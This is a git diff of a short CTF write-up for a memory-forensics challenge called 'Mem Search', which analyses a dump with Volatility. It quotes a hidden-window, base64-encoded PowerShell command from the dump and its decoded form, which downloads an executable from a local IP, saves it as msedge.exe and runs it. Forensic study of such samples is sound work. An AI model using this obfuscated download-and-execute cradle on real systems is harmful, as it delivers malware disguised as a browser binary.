@@ -1,9 +1,11 @@
 ---
 created: 2024-06-22T18:02
-updated: 2024-06-22T18:13
+updated: 2024-06-24T22:30
 ---
 
-# analysis
+# Mem Search
+
+## analysis
 
 `vol.py -f chal_mem_search.DUMP windows.info`
 
@@ -33,7 +35,8 @@ We soon come across this command, that calls powershell.
 "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -window hidden -noni -enc JAB1AD0AJwBoAHQAJwArACcAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAwAC4AMQA2ADoAOAAyADgAMgAvAEIANgA0AF8AZABlAGMAJwArACcAbwBkAGUAXwBSAGsAeABCAFIAMwB0AEUAWQBYAGwAMQBiAFYAOQAwAGEARwBsAHoAWAAnACsAJwAyAGwAegBYADMATgBsAFkAMwBKAGwAZABGADkAbQBhAFcAeABsAGYAUQAlADMAJwArACcARAAlADMARAAvAGMAaABhAGwAbABfAG0AZQBtAF8AcwBlACcAKwAnAGEAcgBjAGgALgBlACcAKwAnAHgAZQAnADsAJAB0AD0AJwBXAGEAbgAnACsAJwBpAFQAZQBtACcAKwAnAHAAJwA7AG0AawBkAGkAcgAgAC0AZgBvAHIAYwBlACAAJABlAG4AdgA6AFQATQBQAFwALgAuAFwAJAB0ADsAdAByAHkAewBpAHcAcgAgACQAdQAgAC0ATwB1AHQARgBpAGwAZQAgACQAZABcAG0AcwBlAGQAZwBlAC4AZQB4AGUAOwAmACAAJABkAFwAbQBzAGUAZABnAGUALgBlAHgAZQA7AH0AYwBhAHQAYwBoAHsAfQA=
 ```
 
-Very suspicious... The base64 decodes to UTF16LE charset. And it's a powershell file with very suspicious obfuscation, with the mention of `Wani`, nice.
+Very suspicious... The base64 decodes to UTF16LE charset. And it's a powershell file with very suspicious obfuscation,
+with the mention of `Wani`, nice.
 
 ```powershell
 $u='ht'+'tp://192.168.0.16:8282/B64_dec'+'ode_RkxBR3tEYXl1bV90aGlzX'+'2lzX3NlY3JldF9maWxlfQ%3'+'D%3D/chall_mem_se'+'arch.e'+'xe';$t='Wan'+'iTem'+'p';mkdir -force $env:TMP\..\$t;try{iwr $u -OutFile $d\msedge.exe;& $d\msedge.exe;}catch{}
